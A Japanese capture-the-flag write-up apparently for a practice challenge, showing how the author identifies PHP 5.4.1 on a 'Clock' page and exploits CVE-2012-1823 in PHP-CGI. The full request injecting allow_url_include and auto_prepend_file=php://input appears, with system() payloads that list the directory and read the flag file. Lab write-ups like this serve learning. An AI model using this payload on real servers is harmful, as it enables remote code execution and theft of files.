とりあえず``curl``。  

```
$ curl -i http://ctfq.u1tramarine.blue/q12/
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 02 May 2022 05:43:02 GMT
Content-Type: text/html
Content-Length: 409
Connection: keep-alive
X-Powered-By: PHP/5.4.1

<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Clock</title>
    <style>
      body
      {
        background: black;
      }
      p
      {
        color: red;
        font-size: xx-large;
        font-weight: bold;
        text-align: center;
        margin-top: 200px;
      }
    </style>
  </head>
  <body>
    <p>2012:1823:20:22:05:02:05:43:02:41:06:55:02</p>
  </body>
</html>
```

``php 5.4.1 脆弱性``でググったら、``CVE-2012-1823``というとんでもない脆弱性が出てきた。  

``http://ctfq.u1tramarine.blue/q12/?-s``でアクセスしたらPHPのソースコードが表示される。  

```php
<?php

    //  Flag is in this directory.

    date_default_timezone_set('UTC');
    
    $t = '2012:1823:20:';
    $t .= date('y:m:d:H:i:s');
    for($i=0;$i<4;$i++)
        $t .= sprintf(':%02d',mt_rand(0,59));
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Clock</title>
    <style>
      body
      {
        background: black;
      }
      p
      {
        color: red;
        font-size: xx-large;
        font-weight: bold;
        text-align: center;
        margin-top: 200px;
      }
    </style>
  </head>
  <body>
    <p><?php echo $t; ?></p>
  </body>
</html>
```

OWASP ZAPで以下のようにリクエスト。  

- Header
  - ``Content-Length``は省略してよい。  

```
POST http://ctfq.u1tramarine.blue/q12/?-d+allow_url_include%3dOn+-d+auto_prepend_file%3dphp://input HTTP/1.1
Host: ctfq.u1tramarine.blue
```

- Body

```php
<?php system('ls -alF');exit;
```

以下が帰ってくる。  

```
total 18672
drwxr-xr-x 1 root     root         4096 Feb 24  2021 ./
drwxr-xr-x 1 www-data www-data     4096 Feb  9  2021 ../
-rwxrwxr-x 1 root     root          109 Feb 24  2021 .htaccess*
-r--r--r-- 1 root     root           22 Feb 24  2021 flag_flag_flag.txt
-r--r--r-- 1 root     root          600 Feb 24  2021 index.php
-r-xr-xr-x 1 root     root     19093315 Feb 24  2021 php.cgi*
```

フラグファイル名が判明したので、OWASP ZAPでHeader部は先程のままに、Body部を以下のように変えてリクエスト。  

```php
<?php system('cat ./flag_flag_flag.txt');exit;
```

### 参考

- [CGI版PHPにリモートからスクリプト実行を許す脆弱性(CVE-2012-1823) ](https://blog.tokumaru.org/2012/05/php-cgi-remote-scripting-cve-2012-1823.html)
- [もっとも悪用されたPHPの脆弱性CVE-2012-1823を検証する youtube](https://www.youtube.com/watch?v=XiIPXQX8RRU)
